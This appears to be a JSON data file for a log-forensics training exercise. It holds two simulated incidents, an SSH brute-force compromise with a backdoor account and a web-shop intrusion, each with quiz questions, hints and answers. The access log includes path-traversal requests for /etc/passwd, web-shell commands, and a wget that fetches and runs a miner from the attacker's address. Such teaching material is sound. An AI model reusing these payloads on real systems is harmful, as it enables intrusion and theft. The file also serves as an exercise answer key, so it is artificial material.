@@ -1,0 +1,169 @@
+{
+  "cases": [
+    {
+      "title": "The 3 a.m. login",
+      "file": "/var/log/auth.log",
+      "intro": "web01 is a small Linux web server. The night shift saw a spike in SSH traffic around 3 a.m. Work through the authentication log and answer the five questions.",
+      "filters": ["Failed password", "Accepted", "sudo", "useradd", "203.0.113.45"],
+      "lines": [
+        "Oct 14 02:58:01 web01 CRON[2104]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)",
+        "Oct 14 02:58:01 web01 CRON[2104]: pam_unix(cron:session): session closed for user root",
+        "Oct 14 03:01:12 web01 sshd[2131]: Accepted publickey for maya from 10.0.4.21 port 51544 ssh2: ED25519 SHA256:pQ8vX2...",
+        "Oct 14 03:01:12 web01 sshd[2131]: pam_unix(sshd:session): session opened for user maya(uid=1001) by (uid=0)",
+        "Oct 14 03:03:40 web01 sshd[2131]: pam_unix(sshd:session): session closed for user maya",
+        "Oct 14 03:05:02 web01 sshd[2160]: Invalid user admin from 203.0.113.45 port 40112",
+        "Oct 14 03:05:04 web01 sshd[2160]: Failed password for invalid user admin from 203.0.113.45 port 40112 ssh2",
+        "Oct 14 03:05:09 web01 sshd[2162]: Invalid user test from 203.0.113.45 port 40130",
+        "Oct 14 03:05:11 web01 sshd[2162]: Failed password for invalid user test from 203.0.113.45 port 40130 ssh2",
+        "Oct 14 03:05:17 web01 sshd[2165]: Invalid user oracle from 203.0.113.45 port 40148",
+        "Oct 14 03:05:19 web01 sshd[2165]: Failed password for invalid user oracle from 203.0.113.45 port 40148 ssh2",
+        "Oct 14 03:06:31 web01 sshd[2171]: Invalid user pi from 198.51.100.7 port 61002",
+        "Oct 14 03:06:33 web01 sshd[2171]: Failed password for invalid user pi from 198.51.100.7 port 61002 ssh2",
+        "Oct 14 03:06:40 web01 sshd[2171]: Connection closed by invalid user pi 198.51.100.7 port 61002 [preauth]",
+        "Oct 14 03:07:02 web01 sshd[2178]: Failed password for root from 203.0.113.45 port 40211 ssh2",
+        "Oct 14 03:07:08 web01 sshd[2178]: Failed password for root from 203.0.113.45 port 40211 ssh2",
+        "Oct 14 03:07:15 web01 sshd[2178]: Failed password for root from 203.0.113.45 port 40211 ssh2",
+        "Oct 14 03:07:15 web01 sshd[2178]: error: maximum authentication attempts exceeded for root from 203.0.113.45 port 40211 ssh2 [preauth]",
+        "Oct 14 03:08:44 web01 sshd[2190]: Invalid user ubuntu from 203.0.113.45 port 40299",
+        "Oct 14 03:08:46 web01 sshd[2190]: Failed password for invalid user ubuntu from 203.0.113.45 port 40299 ssh2",
+        "Oct 14 03:09:58 web01 sshd[2197]: Invalid user ftpuser from 198.51.100.7 port 61240",
+        "Oct 14 03:10:00 web01 sshd[2197]: Failed password for invalid user ftpuser from 198.51.100.7 port 61240 ssh2",
+        "Oct 14 03:11:20 web01 sshd[2205]: Failed password for deploy from 203.0.113.45 port 40388 ssh2",
+        "Oct 14 03:11:27 web01 sshd[2205]: Failed password for deploy from 203.0.113.45 port 40388 ssh2",
+        "Oct 14 03:12:03 web01 sshd[2209]: Failed password for deploy from 203.0.113.45 port 40402 ssh2",
+        "Oct 14 03:12:41 web01 sshd[2212]: Failed password for deploy from 203.0.113.45 port 40415 ssh2",
+        "Oct 14 03:13:19 web01 sshd[2216]: Failed password for deploy from 203.0.113.45 port 40431 ssh2",
+        "Oct 14 03:14:07 web01 sshd[2220]: Accepted password for deploy from 203.0.113.45 port 50122 ssh2",
+        "Oct 14 03:14:07 web01 sshd[2220]: pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)",
+        "Oct 14 03:14:08 web01 systemd-logind[512]: New session 41 of user deploy.",
+        "Oct 14 03:15:31 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id",
+        "Oct 14 03:15:31 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1002)",
+        "Oct 14 03:16:02 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash sysupd",
+        "Oct 14 03:16:02 web01 useradd[2251]: new group: name=sysupd, GID=1003",
+        "Oct 14 03:16:02 web01 useradd[2251]: new user: name=sysupd, UID=1003, GID=1003, home=/home/sysupd, shell=/bin/bash, from=/dev/pts/1",
+        "Oct 14 03:16:20 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo sysupd",
+        "Oct 14 03:16:20 web01 usermod[2258]: add 'sysupd' to group 'sudo'",
+        "Oct 14 03:17:45 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tee -a /root/.ssh/authorized_keys",
+        "Oct 14 03:19:12 web01 sshd[2220]: Received disconnect from 203.0.113.45 port 50122:11: disconnected by user",
+        "Oct 14 03:19:12 web01 sshd[2220]: pam_unix(sshd:session): session closed for user deploy",
+        "Oct 14 03:20:01 web01 CRON[2290]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)",
+        "Oct 14 03:20:01 web01 CRON[2290]: pam_unix(cron:session): session closed for user root",
+        "Oct 14 03:42:55 web01 sshd[2318]: Accepted publickey for sysupd from 203.0.113.45 port 50877 ssh2: RSA SHA256:Zk1r9a...",
+        "Oct 14 03:42:55 web01 sshd[2318]: pam_unix(sshd:session): session opened for user sysupd(uid=1003) by (uid=0)",
+        "Oct 14 03:44:10 web01 sshd[2318]: pam_unix(sshd:session): session closed for user sysupd",
+        "Oct 14 07:58:30 web01 sshd[2902]: Accepted publickey for maya from 10.0.4.21 port 52210 ssh2: ED25519 SHA256:pQ8vX2...",
+        "Oct 14 07:58:30 web01 sshd[2902]: pam_unix(sshd:session): session opened for user maya(uid=1001) by (uid=0)",
+        "Oct 14 07:59:02 web01 sudo:     maya : TTY=pts/0 ; PWD=/home/maya ; USER=root ; COMMAND=/usr/bin/apt update"
+      ],
+      "questions": [
+        {
+          "question": "Two outside addresses tried to guess passwords. Which one eventually got in?",
+          "answers": ["203.0.113.45"],
+          "hint": "Filter for Accepted. Which logins came from outside the 10.x internal network?",
+          "explain": "198.51.100.7 is background noise: a scanner trying default usernames like pi and ftpuser, then giving up. 203.0.113.45 kept going until a login was accepted.",
+          "evidence": "Accepted password for deploy"
+        },
+        {
+          "question": "Which account did the attacker break into?",
+          "answers": ["deploy"],
+          "hint": "Look at the user named in the attacker's Accepted line.",
+          "explain": "Usernames like admin and test don't exist here (Invalid user), and root was blocked. deploy is a real account with a guessable password: a classic weak spot.",
+          "evidence": "Failed password for deploy"
+        },
+        {
+          "question": "At what time did the attacker first log in successfully? (HH:MM:SS)",
+          "answers": ["03:14:07"],
+          "hint": "The timestamp at the start of the first Accepted line from 203.0.113.45.",
+          "explain": "03:14:07 is the start of the compromise. In a real case, everything this account did after that moment is suspect.",
+          "evidence": "Accepted password for deploy"
+        },
+        {
+          "question": "What backdoor account did they create?",
+          "answers": ["sysupd"],
+          "hint": "Filter for useradd.",
+          "explain": "sysupd is named to look like a system service. They also added it to the sudo group, and 25 minutes later it logged in from the same attacker address.",
+          "evidence": "sysupd"
+        },
+        {
+          "question": "Which file did they write to so they could log in as root later? (full path)",
+          "answers": ["/root/.ssh/authorized_keys"],
+          "hint": "Filter for sudo and read each COMMAND=. One of them appends to a file with tee -a.",
+          "explain": "Adding a public key to root's authorized_keys lets the attacker log in as root without any password. Changing deploy's password alone wouldn't lock them out: you'd also need to remove the key and the sysupd account.",
+          "evidence": "authorized_keys"
+        }
+      ]
+    },
+    {
+      "title": "Uploads gone wrong",
+      "file": "/var/log/nginx/access.log",
+      "intro": "shop.example is a small online shop. Customers reported the site felt slow this morning. Read the web server's access log and work out what happened.",
+      "filters": ["404", "Nikto", "POST", "..%2F", "cmd="],
+      "lines": [
+        "198.51.100.14 - - [14/Oct/2026:10:02:11 +0000] \"GET / HTTP/1.1\" 200 8123 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/131.0\"",
+        "198.51.100.14 - - [14/Oct/2026:10:02:12 +0000] \"GET /static/shop.css HTTP/1.1\" 200 14022 \"https://shop.example/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/131.0\"",
+        "198.51.100.14 - - [14/Oct/2026:10:02:40 +0000] \"GET /products/blue-mug HTTP/1.1\" 200 6310 \"https://shop.example/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/131.0\"",
+        "203.0.113.80 - - [14/Oct/2026:10:03:05 +0000] \"GET /products/notebook HTTP/1.1\" 200 5980 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) Safari/604.1\"",
+        "192.0.2.66 - - [14/Oct/2026:10:04:00 +0000] \"GET / HTTP/1.1\" 200 8123 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check)\"",
+        "192.0.2.66 - - [14/Oct/2026:10:04:01 +0000] \"GET /admin/ HTTP/1.1\" 302 0 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000041)\"",
+        "192.0.2.66 - - [14/Oct/2026:10:04:01 +0000] \"GET /phpmyadmin/ HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000052)\"",
+        "192.0.2.66 - - [14/Oct/2026:10:04:01 +0000] \"GET /.git/config HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000077)\"",
+        "192.0.2.66 - - [14/Oct/2026:10:04:02 +0000] \"GET /backup.zip HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000093)\"",
+        "192.0.2.66 - - [14/Oct/2026:10:04:02 +0000] \"GET /wp-login.php HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000118)\"",
+        "192.0.2.66 - - [14/Oct/2026:10:04:02 +0000] \"GET /download.php?file=invoice.pdf HTTP/1.1\" 200 30411 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000140)\"",
+        "203.0.113.80 - - [14/Oct/2026:10:04:20 +0000] \"POST /cart/add HTTP/1.1\" 200 412 \"https://shop.example/products/notebook\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) Safari/604.1\"",
+        "192.0.2.66 - - [14/Oct/2026:10:06:15 +0000] \"GET /download.php?file=..%2F..%2F..%2F..%2Fetc%2Fhostname HTTP/1.1\" 200 6 \"-\" \"curl/8.5.0\"",
+        "192.0.2.66 - - [14/Oct/2026:10:06:31 +0000] \"GET /download.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\" 200 1843 \"-\" \"curl/8.5.0\"",
+        "192.0.2.66 - - [14/Oct/2026:10:07:02 +0000] \"GET /download.php?file=..%2F..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1\" 403 0 \"-\" \"curl/8.5.0\"",
+        "192.0.2.66 - - [14/Oct/2026:10:07:40 +0000] \"GET /download.php?file=..%2F..%2Fconfig%2Fsettings.ini HTTP/1.1\" 200 512 \"-\" \"curl/8.5.0\"",
+        "198.51.100.14 - - [14/Oct/2026:10:08:05 +0000] \"GET /cart HTTP/1.1\" 200 3302 \"https://shop.example/products/blue-mug\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/131.0\"",
+        "192.0.2.66 - - [14/Oct/2026:10:09:12 +0000] \"POST /admin/login HTTP/1.1\" 302 0 \"-\" \"curl/8.5.0\"",
+        "192.0.2.66 - - [14/Oct/2026:10:09:30 +0000] \"POST /admin/upload.php HTTP/1.1\" 200 87 \"https://shop.example/admin/\" \"curl/8.5.0\"",
+        "192.0.2.66 - - [14/Oct/2026:10:09:51 +0000] \"GET /uploads/avatar.php?cmd=id HTTP/1.1\" 200 54 \"-\" \"curl/8.5.0\"",
+        "192.0.2.66 - - [14/Oct/2026:10:10:03 +0000] \"GET /uploads/avatar.php?cmd=uname%20-a HTTP/1.1\" 200 112 \"-\" \"curl/8.5.0\"",
+        "203.0.113.80 - - [14/Oct/2026:10:10:15 +0000] \"GET /checkout HTTP/1.1\" 200 7740 \"https://shop.example/cart\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) Safari/604.1\"",
+        "192.0.2.66 - - [14/Oct/2026:10:10:44 +0000] \"GET /uploads/avatar.php?cmd=cat%20..%2Fconfig%2Fsettings.ini HTTP/1.1\" 200 512 \"-\" \"curl/8.5.0\"",
+        "192.0.2.66 - - [14/Oct/2026:10:11:30 +0000] \"GET /uploads/avatar.php?cmd=wget%20http%3A%2F%2F192.0.2.66%2Fminer%20-O%20%2Ftmp%2F.m HTTP/1.1\" 200 0 \"-\" \"curl/8.5.0\"",
+        "192.0.2.66 - - [14/Oct/2026:10:11:58 +0000] \"GET /uploads/avatar.php?cmd=chmod%20%2Bx%20%2Ftmp%2F.m%3B%20%2Ftmp%2F.m%20%26 HTTP/1.1\" 200 0 \"-\" \"curl/8.5.0\"",
+        "198.51.100.14 - - [14/Oct/2026:10:12:20 +0000] \"GET /products/blue-mug HTTP/1.1\" 200 6310 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/131.0\"",
+        "203.0.113.80 - - [14/Oct/2026:10:14:02 +0000] \"POST /checkout/pay HTTP/1.1\" 504 0 \"https://shop.example/checkout\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) Safari/604.1\""
+      ],
+      "questions": [
+        {
+          "question": "Which IP address is attacking the shop?",
+          "answers": ["192.0.2.66"],
+          "hint": "Filter for 404. Normal customers rarely ask for pages that don't exist.",
+          "explain": "A burst of requests for admin panels, .git and backup files in under two seconds is automated scanning, all from one address.",
+          "evidence": "192.0.2.66"
+        },
+        {
+          "question": "Which scanning tool does its user agent give away?",
+          "answers": ["nikto"],
+          "hint": "The user agent is the last quoted part of each line.",
+          "explain": "Nikto is a free web vulnerability scanner that announces itself by default. Real attackers often change the user agent, so never rely on it alone, but it's a great first clue.",
+          "evidence": "Nikto"
+        },
+        {
+          "question": "Through path traversal, which system file did they successfully read? (full path)",
+          "answers": ["/etc/passwd"],
+          "hint": "..%2F is a URL-encoded ../ (step up one folder). Look for traversal requests that returned 200, then decode the path.",
+          "explain": "download.php trusted the file name it was given, so ../../../../etc/passwd climbed out of the downloads folder. /etc/shadow got a 403, but settings.ini (with the admin password) leaked too.",
+          "evidence": "etc%2Fpasswd"
+        },
+        {
+          "question": "What is the file name of the web shell they uploaded?",
+          "answers": ["avatar.php"],
+          "hint": "Filter for POST, then look for a file in /uploads that's being called with a cmd= parameter.",
+          "explain": "An upload form accepted a .php file and saved it where the web server runs PHP. Every ?cmd= request after that runs a command on the server.",
+          "evidence": "avatar.php"
+        },
+        {
+          "question": "What was the first command they ran through the web shell?",
+          "answers": ["id"],
+          "hint": "Filter for cmd= and take the earliest one.",
+          "explain": "id shows which user the web server runs as: the attacker's first question on any new foothold. Later they downloaded something called miner to /tmp/.m and ran it in the background, which explains why the shop felt slow.",
+          "evidence": "cmd=id"
+        }
+      ]
+    }
+  ]
+}
